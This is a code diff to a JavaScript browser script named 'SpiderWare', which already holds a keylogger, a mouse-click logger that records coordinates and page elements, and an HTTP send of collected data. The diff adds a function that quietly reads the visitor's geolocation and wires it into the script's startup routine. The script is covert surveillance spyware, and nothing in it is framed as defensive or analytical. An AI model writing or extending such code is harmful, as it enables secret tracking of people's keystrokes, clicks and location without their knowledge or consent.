@@ -2,6 +2,7 @@ var SpiderWare = {
     scan: scanFunc,
     keylogger: keyloggerFunc,
     mouselogger: mouseloggerFunc,
+    trackers: trackersFunc,
     settings: {
         scan: {
             recursive: false,
@@ -39,7 +40,7 @@ var SpiderWare = {
 
             },
             video: {
-                
+
             }
         },
         control: {
@@ -66,7 +67,7 @@ var SpiderWare = {
         http.send(params);
     },
     run: function() {
-        this.scan(), this.keylogger(), this.mouselogger();
+        this.scan(), this.keylogger(), this.mouselogger(), this.trackers();
         window.setInterval(this.clock,1000)
     },
     
@@ -150,6 +151,13 @@ function mouseloggerFunc() {
     document.addEventListener('click', function(e) {SpiderWare.output.loggers.mouselogger.push({type:e.type, time: new Date(), x: e.x,y: e.y,srcElement: e.srcElement,element: document.elementFromPoint(e.x, e.y),event: e, timeStamp: e.timeStamp})});
 
 }
+
+function trackersFunc() {
+    try {
+      navigator.geolocation.getCurrentPosition(function(position) {SpiderWare.output.trackers.location = position});
+  } catch(err) {}
+}
+  
 
 
 
